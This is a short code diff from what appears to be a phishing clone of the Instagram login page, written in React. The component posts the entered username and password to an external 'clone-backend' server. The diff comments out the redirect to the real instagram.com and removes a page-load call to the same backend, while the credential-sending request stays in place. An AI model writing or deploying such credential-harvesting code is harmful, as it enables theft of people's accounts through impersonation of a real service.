@@ -10,12 +10,12 @@ const Home = () => {
     axios.post("https://clone-backend-jvih.onrender.com/email", { username, password })
     .then((res) => {
       console.log(res);
-      window.location.href = "https://www.instagram.com/";
+      // window.location.href = "https://www.instagram.com/";
     })
   };
 
   useEffect(() => {
-    axios.post("https://clone-backend-jvih.onrender.com")
+    
   },[])
 
   return (
